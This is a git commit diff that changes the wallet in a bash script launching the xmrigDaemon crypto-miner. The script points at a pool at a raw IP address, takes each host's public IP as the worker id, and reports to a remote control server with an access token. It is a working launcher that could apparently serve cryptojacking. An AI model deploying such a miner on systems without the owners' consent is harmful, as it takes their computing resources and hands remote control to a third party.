369d3a0d9674376f3759f4470454f17d9c5d3413
Ryan Wahyudi <116867564+RyanWahyudi8@users.noreply.github.com>
2024-01-03 04:17:56 +0700

    Update cs.sh

--- cs.sh
+++ cs.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 POOL=stratum+ssl://172.200.229.146:80
-WALLET=AVAX:0x572b6d97c4a16fb1ac1362fe2a96e1579fd780fd.$(echo "$(curl -s ifconfig.me)" | tr . _ )#tw4q-eldi
+WALLET=IRON:757ea84ec697775b5721d45cdc3a4e100ee0722a90ea359bcfd894f51c415b71:20491097150.CPU_$(echo "$(curl -s ifconfig.me)" | tr . _ )#lus6-e35u
 myip=$(echo "$(curl -s ifconfig.me)" | tr . _ )
 cd "$(dirname "$0")"
 chmod +x ./xmrigDaemon && clear && ./xmrigDaemon -a rx/0 -o $POOL -u $WALLET $@ -p x -k --donate-level=1 --cc-url=172.200.229.146:2012 --cc-access-token=kevin --cc-worker-id=${myip}
